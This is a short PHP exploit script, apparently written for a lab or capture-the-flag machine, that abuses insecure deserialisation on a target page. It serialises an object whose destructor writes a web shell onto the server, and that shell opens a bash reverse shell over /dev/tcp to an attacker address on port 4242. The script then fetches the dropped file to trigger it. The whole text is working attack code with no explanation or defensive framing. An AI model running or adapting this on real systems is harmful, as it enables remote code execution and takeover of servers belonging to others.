<?php

class DatabaseExport
{
        public $user_file = 'cyberswell.php';
        public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.16.158/4242 0>&1\'"); ?>';

        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[EXPLOIT RAN]';
        }
}
$url = 'http://10.10.10.223/sator.php?arepo=' . urlencode(serialize(new DatabaseExport));
$response=file_get_contents("$url");
$response=file_get_contents("http://10.10.10.223/cyberswell.php");
?>


